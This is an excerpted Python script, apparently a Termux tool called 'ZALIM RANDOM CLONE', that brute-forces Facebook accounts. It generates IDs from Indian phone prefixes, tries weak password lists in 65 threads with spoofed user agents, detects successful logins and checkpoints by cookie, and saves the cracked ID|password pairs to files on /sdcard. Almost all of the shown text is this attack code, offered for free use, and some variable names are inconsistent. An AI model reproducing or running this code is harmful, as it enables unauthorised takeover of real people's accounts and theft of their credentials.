...
\033[1;91m
    ...
    |___  / / _ \ | |   |_   _|  \/  |
      ...
      / /  |  _  || |     | | | |\/| |
    ./ /___| | | || |_____| |_| |  | |
    \_____/\_| |_/\_____/\___/\_|  |_/ \033[0;97m

 \033[1;34m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 \033[1;34m┃ [✓] AUTHOR    \033[1;91m: \033[1;92mZALIM      \033[1;34m                ┃  
 \033[1;34m┃ [✓] TOOL      \033[1;91m: \033[1;92mRANDOM CLONE    \033[1;34m           ┃   
 \033[1;34m┃ [✓] STATUS    \033[1;91m: \033[1;92mFREE      \033[1;34m                 ┃   
 \033[1;34m┃ [✓] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI     \033[1;34m           ┃     
 \033[1;34m┃ [✓] GITHUB    \033[1;91m: \033[1;92mZALIM-0786      \033[1;34m           ┃
 \033[1;34m┃ [✓] FACEBOOK  \033[1;91m: \033[1;92mZALIM    \033[1;34m                  ┃
 \033[1;34m┃ [✓] WHATSAPP  \033[1;91m: \033[1;92m+Fuck You    \033[1;34m              ┃   
 \033[1;34m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"""
...
def fia():    
			print(logo)
			print('\x1b[97;1m>>> ZALIM  VERSION :\x1b[1;92m 1.4 ')
			print('>>>TOOL TYP : \x1b[91;1m FREE')
			linex()
			...
			if xd in ['1','01']:
				...
				for i in range(ps_limit):
					print('\x1b[1;92m Example:\x1b[97;1m first last, firstlast,first123,First@123,57273200,59039200')
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[ZALIM] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[1;31m[ZALIM-CP] %s | %s'%(ids,pas))
				
				open('\x1b[91;1m/sdcard/ZALIM-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in XIYAD:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[ZALIM-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/ZALIM-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[ZALIM] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;32m[ZALIM-OK] %s | %s'%(ids,pas))
				
				open('/sdcard/ZALIM-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in ZALIM :
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[ZALIM-CP] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/ZALIM-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def random_number1():
	...
	os.system('clear')
	print(logo)
	print('\x1b[92;1m[√] EXAMPLE :+91962,+91930,+91632,+91872.''\x1b[1;91mETC')
	linex()
...
def random_number2():
	...
	os.system('clear')
	print(logo)
	print('\x1b[92;1m[√] EXAMPLE :+91962,+91930,+91632,+91872.ETC')
	linex()
...
def random_number3():
	...
	with ThreadPool(max_workers=65) as yaari:
		...
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode+guru,'+91','India','India','i love you']
			yaari.submit(fcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mZALIM\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
    ...
    'user-agent': 'Mozilla/5.0 (Linux; U; Android 14;  en-us; GT-N344Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4825.116 Mobile Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\x1b[1;92m[ZALIM-OK] '+uid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[38;5;208m[ZALIM-CP] '+uid+' | '+ps+'\33[0;97m')
